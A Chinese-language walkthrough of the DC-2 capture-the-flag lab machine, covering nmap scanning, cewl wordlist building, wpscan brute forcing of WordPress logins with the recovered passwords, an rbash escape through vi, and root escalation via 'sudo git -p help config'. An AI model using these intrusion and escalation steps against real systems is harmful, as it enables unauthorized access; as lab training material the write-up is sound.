# DC-2

## 端口扫描

```
nmap -sC -sV -Pn 192.168.56.117
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 08:22 EDT
Nmap scan report for 192.168.56.117
Host is up (0.00046s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Did not follow redirect to http://dc-2/
|_http-server-header: Apache/2.4.10 (Debian)
MAC Address: 08:00:27:71:D4:1C (Oracle VirtualBox virtual NIC)
```

设置hosts文件

```
192.168.56.117 dc-2
```

直接去看web页面

## 漏洞发现和利用

找到flag1

```
Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```

发现关键字`cewl`，cewl可以收集web页面的单词

```
cewl http://dc-2 -w pass.txt
```

### 用`wpscan`枚举一下用户

```
wpscan --url http://dc-2 -e u
```

然后爆破

```
wpscan --url http://dc-2 -U user.txt -P pass.txt
```

```
| Username: jerry, Password: adipiscing
| Username: tom, Password: parturient
```

登录jerry找到flag2

```
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```

> 如果wordpress不能利用了，那就换一条路

提示说wordpess没有漏洞了，那就再用nmap扫一下其他端口

```
nmap -p- 192.168.56.117
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
```

用sV选项扫描

```
nmap -p 7744 -sV 192.168.56.117
```

```
PORT     STATE SERVICE VERSION
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
MAC Address: 08:00:27:71:D4:1C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

其实他就是SSH服务

## SSH登录

使用tom登录

### 使用`vi`进行绕过rbash

打开vi

```
set shell=/bin/bash
shell
```

```
export PATH=$PATH:/bin
export PATH=$PATH:/usr/bin
```

**`flag3.txt`**

```
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

切换到jerry

```
su - jerry
```

找到`flag4`

```
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

## 提权

最后就是要提权到root了

```
sudo -l
```

```
(root) NOPASSWD: /usr/bin/git
```

### git提权

可以在下面网站找到sudo提权方法

[GTFOBins](https://gtfobins.github.io/)

![image-20240416215029798](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416215029798.png)

```
sudo git -p help config
!/bin/sh
```

拿到最后的`final-flag.txt`

![image-20240416215230308](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416215230308.png)

## 总结

> 1.这个靶机分5个flag，每一步都给了一定的提示，思路比较明确
>
> 2.`wpscan`专门扫描`wordpress`
>
> 3.绕过`rbash`的方法，[rbash逃逸方法简述](https://blog.csdn.net/qq_43168364/article/details/111830233)
>
> 4.`git`进行提权,`sudo git -p help config`,然后输入`!/bin/bash`

